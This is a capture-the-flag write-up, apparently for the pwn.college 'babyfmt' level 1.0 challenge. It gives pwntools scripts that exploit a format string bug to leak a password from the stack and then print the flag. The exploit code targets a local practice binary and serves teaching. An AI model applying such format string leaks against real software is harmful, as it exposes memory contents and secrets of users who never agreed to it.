# Format String Exploits 1.0

Running the provided executable file, we are tasked to leak the flag from the stack. Then, we can use `%p %p %p ... %p` to find the offset, which happens to be in `%6$p` and `%7$p`. 

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyfmt_level1.0")

io = process()

print("===== STARTING EXPLOIT =====")

payload = b''
for i in range(30):
    payload += f"%{i}$p".encode()

io.sendline(payload) # found in %6$p and %7$p
```

Finally, we read the hex and process the flag. Final exploit:

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyfmt_level1.0")

io = process()

print("===== STARTING EXPLOIT =====")

io.sendline(b"%6$p %7$p")

io.recvuntil(b'data!\n\n')

password = io.recvline(False).decode()

password = password.split(' ')
password = [p[2:] for p in password]
password = [[chr(int(p[i:i+2], 16)) for i in range(0, len(p), 2)] for p in password]
password = [''.join(reversed(password[i])) for i in range(len(password))]
password = ''.join(password).encode()

io.sendline(password)

io.recvuntil(b'Password!\n')
print(f'Flag: {io.recvline(False)}')
```

![[Format String Exploits/images/Level1.0.png]]